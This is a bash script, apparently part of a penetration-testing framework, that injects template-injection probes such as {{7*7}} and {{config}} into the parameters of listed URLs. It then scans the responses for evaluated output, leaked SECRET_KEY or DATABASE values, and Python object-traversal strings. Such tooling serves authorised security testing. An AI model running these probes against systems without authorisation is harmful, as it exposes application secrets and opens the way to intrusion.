#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"; BASE_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
source "$SCRIPT_DIR/../lib.sh"
CLASS=ssti; PAYLOADS="$SCRIPT_DIR/payloads.txt"
ENGAGEMENT="${1:?Usage: $0 <engagement-id> [urls-file]}"
URLS_FILE="${2:-$BASE_DIR/runtime/engagements/$ENGAGEMENT/recon/urls/ssti.txt}"
HITS_DIR="$BASE_DIR/runtime/engagements/$ENGAGEMENT/recon/hits/$CLASS"
mkdir -p "$HITS_DIR"
[ ! -f "$PAYLOADS" ] && err "Missing $PAYLOADS" && exit 1
[ ! -f "$URLS_FILE" ] && err "Missing $URLS_FILE" && exit 1
pat_ref "ssti"

detect() {
  local body="$1" payload="$2"
  case "$payload" in
    "{{7*7}}")   echo "$body" | grep -q "49" && return 0 ;;
    "{{7*'7'}}") echo "$body" | grep -qi "7777777" && return 0 ;;
    "<%= 7*7 %>") echo "$body" | grep -q "49" && return 0 ;;
    "{{config}}") echo "$body" | grep -qiE "(DEBUG|SECRET_KEY|ENV|DATABASE)" && return 0 ;;
    "{$smarty.version}") echo "$body" | grep -qE "^[0-9]+\.[0-9]+\.[0-9]+" && return 0 ;;
    *) echo "$body" | grep -qiE "(__class__|__mro__|__subclasses__|__bases__|app\.request|dump\(app\))"; return $? ;;
  esac
  return 1
}

TOTAL=0; HIT_COUNT=0
while IFS= read -r url || [ -n "$url" ]; do
  [ -z "$url" ] && continue
  info "Testing $url"
  param=$(echo "$url" | grep -oP '(?<=\?|&)[^=]+(?==)' | head -1)
  local_hits=0
  while IFS= read -r payload || [ -n "$payload" ]; do
    [ -z "$payload" ] && continue
    test_url=$(inject_payload "$url" "$payload")
    tmpf=$(mktemp); resp=$(fetch_url "$test_url" "$tmpf")
    body=$(cat "$tmpf" 2>/dev/null || true); rm -f "$tmpf"
    if detect "$body" "$payload"; then
      local_hits=1; safe=$(echo "$url" | sed 's|https\?://||;s/[^a-zA-Z0-9]/_/g')
      echo "$payload" >> "$HITS_DIR/${safe}_${param}.txt"
      log "HIT on $param: $payload"
      break
    fi
    TOTAL=$((TOTAL + 1))
  done < "$PAYLOADS"
  [ "$local_hits" -eq 1 ] && HIT_COUNT=$((HIT_COUNT + 1))
done < "$URLS_FILE"
log "SSTI done: $HIT_COUNT URLs with hits"
exit "$HIT_COUNT"
